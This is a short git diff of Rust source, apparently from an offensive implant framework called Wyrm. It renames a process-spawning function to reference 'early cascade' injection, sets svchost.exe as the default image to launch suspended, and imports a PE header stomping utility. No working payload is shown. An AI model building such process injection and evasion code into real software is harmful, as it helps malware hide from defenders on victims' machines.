@@ -25,12 +25,12 @@ use windows_sys::Win32::{
     },
 };
 
-use crate::{dbgprint, utils::pe_stomp::stomp_pe_header_bytes};
+use crate::utils::pe_stomp::stomp_pe_header_bytes;
 
 // TODO move to profile &/ default?
 const SPAWN_AS_IMAGE: &'static [u8; 32] = b"C:\\Windows\\System32\\svchost.exe\0";
 
-pub(super) fn spawn_sibling(mut buf: Vec<u8>) -> WyrmResult<String> {
+pub(super) fn early_cascade_spawn_child(mut buf: Vec<u8>) -> WyrmResult<String> {
     //
     // Create the process in a suspended state, using the image specified by either the user (TODO) or
     // svchost as the default image.
